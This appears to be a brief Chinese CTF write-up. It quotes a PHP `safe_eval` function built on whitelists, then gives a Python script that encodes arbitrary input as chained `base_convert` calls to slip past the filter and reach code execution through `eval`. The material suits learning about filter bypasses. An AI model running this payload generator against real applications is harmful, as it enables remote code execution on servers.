 拿到这个看下waf就行了
 ```
 function safe_eval($calculus) {
   preg_match_all("/([a-z_]+)/", strtolower($calculus), $words);
   $words = $words[0];
 
   $accepted_words = ['base_convert', 'pi'];
   $alphabet = str_split('_abcdefghijklmnopqrstuvwxyz0123456789.+-*/%()[],');
 
   var_dump($calculus);
 
   $safe = true;
   for ($i = 0; $i < count($words); $i++) {
       if (strlen($words[$i]) && (array_search($words[$i], $accepted_words) === false)) {
           $safe = false;
       }
   }
 
   for ($i = 0; $i < strlen($calculus); $i++) {
       if (array_search($calculus[$i], $alphabet) === false) {
           $safe = false;
       }
   }
 
   if (strlen($calculus) > 256) return "Expression too long.";
   $ans = '';
   if (($safe) === false) $ans = "This calculus is not safe.";
   else eval('$ans=' . $calculus . ";");
   return $ans;
}

```
可以看到用了白名单来限制字符，以及对输入的长度有一定要求
这里单独提了$accepted_words = ['base_convert', 'pi'];出来，那么就是base_convert改造成hex2bin这种操作
写个脚本套一下就行
```
import string
import re

def evc36_encode(evc):
    num_str = '0123456789abcdefghijklmnopqrstuvwxyz'
    evcc = 0
    for i in evc:
        evcc= num_str.index(i) + evcc*36
    return evcc 

while 1:
    evcc=''
    evc= input("input mes:")
    evc_sp=re.findall("([0-9a-z]*)",evc)
    d=string.printable
    for k in '0123456789abcdefghijklmnopqrstuvwxyz':
        d=d.replace(k,"")
    evccc=0
    for j in range(len(evc_sp[:-1])):
        #print(evc_sp,j,evc_sp[j],evccc)
        if evcc !='':
            evcc+='.'
        if evc_sp[j]!="":
            num = evc36_encode(evc_sp[j])
            evccc +=len(evc_sp[j])
            evcc+="base_convert({},10,36)".format(num)
        elif evc_sp[j] == "":
            evcc+="base_convert(16191,10,36)({})".format(ord(evc[evccc:evccc+1]))
            evccc +=1
    print(evcc)
```